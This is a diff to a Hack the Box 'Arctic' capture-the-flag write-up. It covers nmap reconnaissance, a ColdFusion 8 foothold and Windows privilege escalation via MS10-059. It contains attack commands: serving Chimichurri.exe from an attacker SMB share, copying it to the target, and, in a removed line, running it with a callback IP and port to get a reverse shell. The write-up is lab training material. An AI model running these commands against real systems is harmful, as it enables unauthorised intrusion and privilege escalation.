@@ -1,12 +1,14 @@
-# Hack the Box - Arctic (INCOMPLETE)
+# Hack the Box - Arctic
 
 ```CSS
 Machine IP: 10.10.10.11 - Windows
 OS Name: Microsoft Windows Server 2008 R2 Standard
 OS Version: 6.1.7600 N/A Build 7600
 System Type: x64
+Vulnerabilities: Adobe Cloud Fusion 8 | Windows Kernel Exploit MS10-059
 ```
 
+## Reconnaisance
 ```CSS
 ▶ nmap -Pn -sS -p- 10.10.10.11 -T4 --min-rate 1000 -oN surface.nmap
 
@@ -38,6 +40,9 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 137.00 seconds
 ```
+---
+
+## Application Mapping
 
 ![image](https://user-images.githubusercontent.com/83878909/229273435-61068519-cbd8-4c2c-be4f-6dd3c1a87e15.png)
 ![image](https://user-images.githubusercontent.com/83878909/229273524-6f7ba081-63f5-4fe6-9b4e-d228ef07ec08.png)
@@ -57,6 +62,8 @@ Nmap done: 1 IP address (1 host up) scanned in 137.00 seconds
 ## User Access
 ![image](https://user-images.githubusercontent.com/83878909/229284344-ca6b43e3-36da-4815-9b62-4432377668eb.png)
 
+---
+
 ## Privilege Escalation
 ### System Information Gathering
 ![image](https://user-images.githubusercontent.com/83878909/229284588-f0e96832-3491-4d2b-a027-54795caa0a55.png)
@@ -65,17 +72,17 @@ Nmap done: 1 IP address (1 host up) scanned in 137.00 seconds
   - Exploit [(Link)](https://github.com/egre55/windows-kernel-exploits)
 
 ### Exploit
-  - 
+  - Tranfer exploit code to target machine.
 ```CSS
 ▶ impacket-smbserver share $(pwd) -smb2support 
 ```
+  - Execute the exploit.
 ```CSS
-C:\ColdFusion8\runtime\bin>copy \\10.10.14.34\share\Chimichurri.exe
+C:\ColdFusion8\runtime\bin>copy \\10.10.14.34\share\chimichurri.exe
 ```
 ![image](https://user-images.githubusercontent.com/83878909/229303301-4b8fef70-a000-42f7-9b72-2dc8c7af037a.png)
 
+## Root
+![image](https://user-images.githubusercontent.com/83878909/229306240-86174770-a64c-4935-a387-669ac07555c3.png)
 
-### Execute the Exploit
-```CSS
-C:\ColdFusion8\runtime\bin>chimichurri.exe 10.10.14.34 31337
-```
+---
